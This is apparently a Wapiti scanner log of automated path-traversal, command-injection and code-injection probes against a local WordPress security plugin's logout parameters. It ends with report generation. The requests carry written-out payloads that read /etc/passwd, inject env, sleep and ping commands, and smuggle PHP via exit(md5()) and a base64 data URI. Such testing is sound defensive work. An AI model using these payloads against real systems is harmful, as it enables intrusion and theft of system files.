2024-03-21 12:39:09.279 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-21 12:39:09.453 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (0)
2024-03-21 12:39:09.628 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (0)
2024-03-21 12:39:09.805 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (0)
2024-03-21 12:39:10.010 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (0)
2024-03-21 12:39:10.214 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 12:39:10.415 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 12:39:10.641 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-21 12:39:10.655 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:10.657 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=%3Benv%3B&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:10.879 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=%7Cenv%7C&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:11.078 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=a%3Benv%3B&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:11.251 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=a%3Benv%3B&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:11.437 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:11.618 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz%3Benv%3B&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:11.808 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz%0Aenv%3B&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:11.985 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=%26set%26&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:12.172 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=set&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:12.348 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=env&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:12.530 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=%2Fe%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:12.715 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:12.895 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:13.082 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:13.256 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:13.445 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:13.622 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:13.800 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:13.986 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:14.170 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:14.353 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:14.530 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:14.717 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:14.893 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:15.070 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=a%60%29%60&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:15.250 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=a%60sleep%2060%60&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:15.439 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=a%3Bsleep%2060%3B&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:15.615 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=a%7Csleep%2060%3B&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:15.791 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=%26ping%20-n%2025%20127.0.0.1%26&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:15.985 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%3Benv%3B (0)
2024-03-21 12:39:16.162 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%7Cenv%7C (0)
2024-03-21 12:39:16.342 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=a%3Benv%3B (0)
2024-03-21 12:39:16.520 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=a%3Benv%3B (0)
2024-03-21 12:39:16.703 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
2024-03-21 12:39:16.884 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%3Benv%3B (0)
2024-03-21 12:39:17.067 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%0Aenv%3B (0)
2024-03-21 12:39:17.253 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%26set%26 (0)
2024-03-21 12:39:17.440 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=set (0)
2024-03-21 12:39:17.622 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=env (0)
2024-03-21 12:39:17.802 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%2Fe%00 (0)
2024-03-21 12:39:17.990 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 12:39:18.172 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 12:39:18.356 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 12:39:18.544 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 12:39:18.739 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 12:39:18.920 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 12:39:19.108 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 12:39:19.293 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 12:39:19.470 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 12:39:19.663 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 12:39:19.845 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 12:39:20.037 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 12:39:20.250 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
2024-03-21 12:39:20.426 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=a%60%29%60 (0)
2024-03-21 12:39:20.609 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=a%60sleep%2060%60 (0)
2024-03-21 12:39:20.785 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=a%3Bsleep%2060%3B (0)
2024-03-21 12:39:20.971 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=a%7Csleep%2060%3B (0)
2024-03-21 12:39:21.164 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%26ping%20-n%2025%20127.0.0.1%26 (0)
2024-03-21 12:39:21.374 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
2024-03-21 12:39:21.392 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1 (0)
2024-03-21 12:39:21.770 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
2024-03-21 12:39:21.840 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
2024-03-21 12:39:21.864 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//all-in-one-wp-security-and-firewall.json/
2024-03-21 12:39:21.865 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//all-in-one-wp-security-and-firewall.json/web_03212024_1238.html with a browser to see this report.
